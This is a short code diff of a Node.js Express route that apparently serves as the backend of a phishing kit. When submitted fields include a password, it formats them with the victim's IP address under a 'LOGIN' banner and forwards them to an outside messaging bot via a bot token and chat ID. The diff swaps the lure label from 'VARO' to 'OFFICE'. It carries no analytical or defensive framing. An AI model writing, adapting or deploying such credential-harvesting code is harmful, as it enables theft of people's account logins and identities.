@@ -316,7 +316,7 @@ app.post('/input', async (req, res) => { // Mark the route handler as async
     console.log(lowerCaseMyObjects);
 
     if (lowerCaseMyObjects.includes('password')) {
-        message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+        message += `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
             `👤 LOGIN \n\n`;
 
         for (const key of myObjects) {
@@ -343,12 +343,10 @@ app.post('/input', async (req, res) => { // Mark the route handler as async
         const sendMessage = sendMessageFor(botToken, chatId);
         sendMessage(message);
         
-    
+    }
     if (!clientId || typeof inputs !== 'object') {
         return res.status(400).send('Missing clientId or inputs object');
     }
-
-    await handleRequest(req, res);
     
     // Check if the client already exists in the database
     db.get("SELECT id, inputs FROM clients WHERE id = ?", [clientId], (err, row) => {
